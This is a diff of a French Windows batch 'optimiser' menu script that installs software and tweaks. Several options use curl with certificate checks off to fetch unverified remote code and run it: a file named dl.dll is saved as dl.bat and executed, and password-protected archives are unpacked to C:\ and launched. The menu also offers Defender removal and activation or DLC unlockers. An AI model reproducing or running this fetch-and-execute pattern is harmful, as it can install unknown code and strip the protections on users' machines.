@@ -26,7 +26,7 @@ set indigo=[38;5;105m
 cd /d %~dp0
 color 7
 
-SET VERSCRIPT=0028
+SET VERSCRIPT=0030
 
 rmdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
 mkdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
@@ -48,6 +48,7 @@ call "%appdata%\StartUp Tools\SFLE.bat"
 C:
 cd "%appdata%\StartUp Tools"
 mode con:cols=147 lines=48
+IF NOT EXIST 7za.exe curl -g -k -L -# -o "7za.exe" "https://tinyurl.com/dl-opt-7za" >nul 2>&1
 cls
 echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 echo    USER : %gold%%USERNAME%%white% ^| COMPUTERNAME : %gold%%COMPUTERNAME%%white% ^| HWID : %gold%%HWID%%white% ^| IP : %gold%%IP%%white% ^| VM : %gold%%VM%%white% ^| GPU : %gold%%GPU%%white%
@@ -57,46 +58,48 @@ echo ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 echo ³  %orange%ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿%white%   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿  ³
 echo ³  %orange%³%white% %gold%Optimisations%white%           %orange%[OPT]%white% %orange%³%white%   ³ %gold%Softwares%white%                     ³   ³ %gold%DLC Unlocker%white%                  ³   ³ %gold%Autres%white%                        ³  ³
 echo ³  %orange%ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´%white%   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
-echo ³  %orange%³%white% %indigo%[ 1]%white% Ancienne Optimisation    %orange%³%white%   ³ %indigo%[13]%white% 7zip                     ³   ³ %indigo%[27]%white% CreamInstaller           ³   ³ %indigo%[37]%white% Edge Remover             ³  ³
+echo ³  %orange%³%white% %indigo%[ 1]%white% Ancienne Optimisation    %orange%³%white%   ³ %indigo%[13]%white% VLC                      ³   ³ %indigo%[25]%white% CreamInstaller           ³   ³ %indigo%[35]%white% Edge Remover             ³  ³
 echo ³  %orange%ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´%white%   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
-echo ³  %orange%³%white% %indigo%[ 2]%white% Nouvelle Optimisation    %orange%³%white%   ³ %indigo%[14]%white% Winrar                   ³   ³ %indigo%[28]%white% Auto-CreamApi 2          ³   ³ %indigo%[38]%white% dControl                 ³  ³
+echo ³  %orange%³%white% %indigo%[ 2]%white% Optimisation             %orange%³%white%   ³ %indigo%[14]%white% Discord                  ³   ³ %indigo%[26]%white% Auto-CreamApi 2          ³   ³ %indigo%[36]%white% dControl                 ³  ³
 echo ³  %orange%ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´%white%   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
-echo ³  %orange%³%white% %indigo%[ 3]%white% Fichier Debug            %orange%³%white%   ³ %indigo%[15]%white% VLC                      ³                                       ³ %indigo%[39]%white% S-W                      ³  ³
-echo ³  %orange%ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ%white%   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
-echo ³                                      ³ %indigo%[16]%white% Discord                  ³   ³ %gold%VPN%white%                           ³   ³ %indigo%[40]%white% TreeSize                 ³  ³
+echo ³  %orange%³%white% %indigo%[ 3]%white% Optimisation      %gold%[BETA]%white% %orange%³%white%   ³ %indigo%[15]%white% TeamSpeak                ³                                       ³ %indigo%[37]%white% Spotify                  ³  ³
+echo ³  %orange%ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´%white%   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
+echo ³  %orange%³%white% %indigo%[ 4]%white% Fichier Debug            %orange%³%white%   ³ %indigo%[16]%white% Auto Clicker             ³   ³ %gold%VPN%white%                           ³   ³ %indigo%[38]%white% TreeSize                 ³  ³
+echo ³  %orange%ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ%white%   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
+echo ³                                      ³ %indigo%[17]%white% Vibrance GUI             ³   ³ %indigo%[27]%white% Cloudflare WARP          ³   ³ %indigo%[39]%white% Everything               ³  ³
 echo ³  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
-echo ³  ³ %gold%Navigateurs Internet%white%          ³   ³ %indigo%[17]%white% TeamSpeak                ³   ³ %indigo%[29]%white% Cloudflare WARP          ³   ³ %indigo%[41]%white% Everything               ³  ³
+echo ³  ³ %gold%Navigateurs Internet%white%          ³   ³ %indigo%[18]%white% RivaTuner                ³   ³ %indigo%[28]%white% RiseupVPN                ³   ³ %indigo%[40]%white% Lossless Scaling         ³  ³
 echo ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
-echo ³  ³ %indigo%[ 4]%white% Firefox                  ³   ³ %indigo%[18]%white% PowerToys                ³   ³ %indigo%[30]%white% RiseupVPN                ³   ³ %indigo%[42]%white% Lossless Scaling         ³  ³
-echo ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
-echo ³  ³ %indigo%[ 5]%white% Waterfox                 ³   ³ %indigo%[19]%white% Python                   ³   ³ %indigo%[31]%white% Proton VPN               ³   ³ %indigo%[43]%white% AnyDesk                  ³  ³
+echo ³  ³ %indigo%[ 5]%white% Firefox                  ³   ³ %indigo%[19]%white% Process Lasso Pro        ³   ³ %indigo%[29]%white% Proton VPN               ³   ³ %indigo%[41]%white% AnyDesk                  ³  ³
 echo ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ  ³
-echo ³  ³ %indigo%[ 6]%white% LibreWolf                ³   ³ %indigo%[20]%white% Deluge                   ³                                                                          ³
+echo ³  ³ %indigo%[ 6]%white% Waterfox                 ³   ³ %indigo%[20]%white% StartAllBack Pro         ³                                                                          ³
 echo ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿  ³
-echo ³  ³ %indigo%[ 7]%white% Chromium                 ³   ³ %indigo%[21]%white% Auto Clicker             ³   ³ %gold%Scripts%white%                       ³   ³ %gold%Virus%white%                         ³  ³
+echo ³  ³ %indigo%[ 7]%white% LibreWolf                ³   ³ %indigo%[21]%white% Revo Uninstaller Pro     ³   ³ %gold%Scripts%white%                       ³   ³ %gold%Virus%white%                         ³  ³
+echo ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
+echo ³  ³ %indigo%[ 8]%white% Chrome                   ³                                       ³ %indigo%[30]%white% Windows Activation       ³   ³ %indigo%[42]%white% Hitman Pro               ³  ³
+echo ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
+echo ³  ³ %indigo%[ 9]%white% Edge                     ³   ³ %gold%Drivers%white%                       ³   ³ %indigo%[31]%white% Win32PrioritySeparation  ³   ³ %indigo%[43]%white% McAfee Stinger Lite %green%2Min%white% ³  ³
 echo ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
-echo ³  ³ %indigo%[ 8]%white% Chrome                   ³   ³ %indigo%[22]%white% Vibrance GUI             ³   ³ %indigo%[32]%white% Windows Activation       ³   ³ %indigo%[44]%white% Hitman Pro               ³  ³
+echo ³  ³ %indigo%[10]%white% Opera                    ³   ³ %indigo%[22]%white% Display Driver Uninstall ³   ³ %indigo%[32]%white% BCDEdit                  ³   ³ %indigo%[44]%white% McAfee Stinger Full %red%35M%white%  ³  ³
 echo ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
-echo ³  ³ %indigo%[ 9]%white% Edge                     ³   ³ %indigo%[23]%white% RivaTuner                ³   ³ %indigo%[33]%white% Win32PrioritySeparation  ³   ³ %indigo%[45]%white% McAfee Stinger Lite %green%2Min%white% ³  ³
+echo ³  ³ %indigo%[11]%white% Opera GX                 ³   ³ %indigo%[23]%white% Snappy Driver Installer  ³   ³ %indigo%[33]%white% Defender Remover         ³   ³ %indigo%[45]%white% Emsisoft                 ³  ³
 echo ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
-echo ³  ³ %indigo%[10]%white% Opera                    ³   ³ %indigo%[24]%white% Process Lasso Pro        ³   ³ %indigo%[34]%white% BCDEdit                  ³   ³ %indigo%[46]%white% McAfee Stinger Full %red%35M%white%  ³  ³
-echo ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
-echo ³  ³ %indigo%[11]%white% Opera GX                 ³   ³ %indigo%[25]%white% StartAllBack Pro         ³   ³ %indigo%[35]%white% Defender Remover         ³   ³ %indigo%[47]%white% Emsisoft                 ³  ³
-echo ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  ³
-echo ³  ³ %indigo%[12]%white% Vivaldi                  ³   ³ %indigo%[26]%white% Revo Uninstaller Pro     ³   ³ %indigo%[36]%white% Spotify                  ³   ³ %indigo%[48]%white% AdwCleaner               ³  ³
+echo ³  ³ %indigo%[12]%white% Vivaldi                  ³   ³ %indigo%[24]%white% Driver Talent Pro        ³   ³ %indigo%[34]%white% S-W                      ³   ³ %indigo%[46]%white% AdwCleaner               ³  ³
 echo ³  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ  ³
 echo ³  %orange%ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿%white%  ³
-echo ³  %orange%O%white% %indigo%[51]%white% MSI Utility V3             %orange%³%white%   %indigo%[52]%white% WPD                        %orange%³%white%   %indigo%[53]%white% ShutUp10++                 %orange%³%white%   %indigo%[54]%white% Script Network %grey%CoutX%white%     %orange%O%white%  ³
+echo ³  %orange%O%white% %indigo%[47]%white% MSI Utility V3             %orange%³%white%   %indigo%[48]%white% WPD                        %orange%³%white%   %indigo%[49]%white% ShutUp10++                 %orange%³%white%   %indigo%[50]%white% Script Network %grey%CoutX%white%     %orange%O%white%  ³
 echo ³  %orange%PÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ%orange%P%white%  ³
-echo ³  %orange%T%white% %indigo%[55]%white% Autoruns                   %orange%³%white%   %indigo%[56]%white% Device Cleanup             %orange%³%white%   %indigo%[57]%white% CCleaner                   %orange%³%white%   %indigo%[58]%white% Dism++                   %orange%T%white%  ³
+echo ³  %orange%T%white% %indigo%[51]%white% Autoruns                   %orange%³%white%   %indigo%[52]%white% Device Cleanup             %orange%³%white%   %indigo%[53]%white% CCleaner                   %orange%³%white%   %indigo%[54]%white% Dism++                   %orange%T%white%  ³
 echo ³  %orange%ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ%white%  ³
 echo ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
 echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
-echo      %indigo%[97]%white% %gold%UPDATE%white%                     º %indigo%[ X ]%white% Nettoyage registres     º                                       º   %indigo%[98]%white% HELP
-echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍ»                              ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+echo      %indigo%[97]%white% %gold%UPDATE / RESET%white%             º %indigo%[ X ]%white% Nettoyage registres     º %indigo%[ B ]%white% Envoyer le fichier "%cyan%Bluescreen%white%" º   %indigo%[98]%white% HELP
+echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 echo      %indigo%[99]%white% COPIER : %bblue% " Fc#$f6EtsY@&duxFqg3B " %defcolor% º %indigo%[100]%white% Configurer les jeux     º                                                       %ggold% %black%VER : %VERSCRIPT%%white% %defcolor%
 echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 set /p CSTARTR="%green%>%white%"
+
+
 
 IF "%CSTARTR%"=="1" (
 	IF NOT EXIST C:\Ect\RWC md C:\Ect\RWC
@@ -107,8 +110,7 @@ IF "%CSTARTR%"=="1" (
 IF "%CSTARTR%"=="2" (
 	PowerShell -Command "Get-AppxPackage *WindowsTerminal* | Remove-AppxPackage" >nul 2>&1
 	IF EXIST Optifiles.7z DEL Optifiles.7z>nul
-	IF NOT EXIST 7za.exe curl -g -k -L -# -o "7za.exe" "https://tinyurl.com/dl-opt-7za" >nul 2>&1
-	curl -g -k -L -# -o "dl.bat" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/dl.dll" & start cmd /c "dl.bat"
+	curl -g -k -L -# -o "dl.bat" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/dl.dll" >nul 2>&1 & start cmd /c "dl.bat"
 	@timeout /t 10>nul
 	IF EXIST Optifiles.7z (7za.exe -y x -p9421 -oC:\ Optifiles.7z >nul)
 	IF EXIST 7za.exe DEL 7za.exe>nul
@@ -118,8 +120,19 @@ IF "%CSTARTR%"=="2" (
 )
 
 IF "%CSTARTR%"=="3" (
+	PowerShell -Command "Get-AppxPackage *WindowsTerminal* | Remove-AppxPackage" >nul 2>&1
+	IF EXIST BETA-Optifiles.7z DEL BETA-Optifiles.7z>nul
+	curl -g -k -L -# -o "BETA-Optifiles.7z" "https://www.dropbox.com/scl/fi/r2scb6kolyvc85jy8a3qm/BETA-Optifiles.7z?rlkey=5zji9qb30xwynhimdevbnfgyo&st=w5iqpn9k&dl=1" >nul 2>&1
+	@timeout /t 10>nul
+	IF EXIST BETA-Optifiles.7z (7za.exe -y x -p9421 -oC:\ BETA-Optifiles.7z >nul)
+	IF EXIST 7za.exe DEL 7za.exe>nul
+	IF EXIST BETA-Optifiles.7z DEL BETA-Optifiles.7z>nul
+	IF EXIST C:\ph_main.exe start C:\ph_main.exe
+	goto :MAINW
+)
+
+IF "%CSTARTR%"=="4" (
 	IF EXIST DEBUG.7z DEL DEBUG.7z>nul
-	IF NOT EXIST 7za.exe curl -g -k -L -# -o "7za.exe" "https://tinyurl.com/dl-opt-7za" >nul 2>&1
 	curl -g -k -L -# -o "DEBUG.7z" "https://github.com/DOCSDROPT/OPTF_1/raw/main/ph_user/DEBUG.dll" >nul 2>&1
 	IF EXIST DEBUG.7z (7za.exe -y x -p9421 -oC:\ DEBUG.7z >nul)
 	IF EXIST 7za.exe DEL 7za.exe>nul
@@ -127,7 +140,7 @@ IF "%CSTARTR%"=="3" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="4" (
+IF "%CSTARTR%"=="5" (
 	IF EXIST "Firefox Installer.exe" DEL "Firefox Installer.exe" >nul
 	curl -g -k -L -# -o "Firefox Installer.exe" "https://download.mozilla.org/?product=firefox-stub&os=win&lang=fr" >nul 2>&1
 	@timeout /t 02>nul
@@ -136,7 +149,7 @@ IF "%CSTARTR%"=="4" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="5" (
+IF "%CSTARTR%"=="6" (
 	IF EXIST "waterfox-portable-win64-6.0.7-29-setup.exe" DEL "waterfox-portable-win64-6.0.7-29-setup.exe" >nul
 	curl -g -k -L -# -o "waterfox-portable-win64-6.0.7-29-setup.exe" "https://github.com/portapps/waterfox-portable/releases/download/6.0.7-29/waterfox-portable-win64-6.0.7-29-setup.exe" >nul 2>&1
 	@timeout /t 02>nul
@@ -145,7 +158,7 @@ IF "%CSTARTR%"=="5" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="6" (
+IF "%CSTARTR%"=="7" (
 	IF EXIST "librewolf-128.0.3-1-windows-x86_64-setup.exe" DEL "librewolf-128.0.3-1-windows-x86_64-setup.exe" >nul
 	curl -g -k -L -# -o "librewolf-128.0.3-1-windows-x86_64-setup.exe" "https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/128.0.3-1/librewolf-128.0.3-1-windows-x86_64-setup.exe" >nul 2>&1
 	@timeout /t 02>nul
@@ -154,13 +167,13 @@ IF "%CSTARTR%"=="6" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="7" (
-	IF EXIST "chrome-win.zip" DEL "chrome-win.zip" >nul
-	curl -g -k -L -# -o "chrome-win.zip" "https://download-chromium.appspot.com/dl/Win_x64?type=snapshots" >nul 2>&1
-	@timeout /t 02>nul
